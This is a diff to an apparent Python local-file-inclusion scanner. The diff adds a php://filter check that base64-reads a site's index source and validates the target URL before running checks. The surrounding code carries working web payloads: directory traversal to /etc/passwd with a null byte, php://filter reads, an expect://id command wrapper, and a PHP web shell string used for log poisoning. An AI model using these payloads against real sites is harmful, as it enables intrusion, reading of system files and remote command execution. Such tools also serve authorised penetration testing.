@@ -27,6 +27,7 @@ path2 = quote("/etc/passwd%00")
 
 # Filter
 filterBase = quote("php://filter/read=convert.base64-encode/resource=/etc/passwd")
+filterBase2 = quote("php://filter/read=convert.base64-encode/resource=index")
 
 # Headers
 phpHeaders1 = quote("expect://id")
@@ -45,9 +46,11 @@ payload = "<?php system($_GET['cmd']); ?>"
 # Checks if the url is valid
 def urlCheck(url):
 	try:
-		openn = urlopen(url)	
+		openn = urlopen(url)
+		return True	
 	except Exception as e:
 		print(colored('[-]', 'red', attrs=['bold']) + ' Not a valid url for LFI, ', e)
+		return False
 		
 
 
@@ -119,6 +122,19 @@ def filterCheck(url):
 	for i in words:
 		if i.endswith('='):
 			print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
+			
+			
+
+			
+def filterCheck2(url):
+	compUrl = url + filterBase2
+	check = urlopen(compUrl)
+	response = check.read().decode('utf-8')
+	clean = stripHtmlTags(response)
+	words = clean.split()
+	for i in words:
+		if i.endswith('='):
+			print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)			
 
 
 
@@ -188,14 +204,15 @@ def main():
 		print(colored("This script doesn't check for Remote File Inclusion (RFI)", 'blue'))
 		print(colored("If it doesn't show any result that means it didn't find anything!!!", 'blue'))
 		url = input('Please enter URL: ')
-		urlCheck(url)
-		dirTraversalCheck(url)
-		dirTraversalCheck2(url)
-		headerCheck1(url)
-		headerCheck2(url)
-		filterCheck(url)
-		cookieCheck(url)
-		logPoisonCheck(url)
+		if urlCheck(url):
+			dirTraversalCheck(url)
+			dirTraversalCheck2(url)
+			headerCheck1(url)
+			headerCheck2(url)
+			filterCheck(url)
+			filterCheck2(url)
+			cookieCheck(url)
+			logPoisonCheck(url)
 	except KeyboardInterrupt:
 		print('\nExiting...')
 	
@@ -204,3 +221,4 @@ def main():
 	
 if __name__ == '__main__':
 	main()
+
